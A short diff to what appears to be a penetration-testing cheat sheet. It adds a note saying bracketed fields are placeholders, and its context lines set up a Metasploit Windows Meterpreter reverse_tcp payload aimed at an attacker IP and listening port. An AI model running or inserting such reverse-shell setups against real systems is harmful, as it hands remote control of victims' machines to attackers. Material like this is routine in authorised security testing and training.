@@ -14,3 +14,9 @@ set PAYLOAD windows/meterpreter/reverse_tcp
 set LHOST [attack-ip] 
 set LPORT [listening-port] 
 run
+
+
+
+************************************************************************************************************************
+* [Square Brackets] indicate changeable fields, tailor them to your use case. Remove the brackets for this to function *
+************************************************************************************************************************
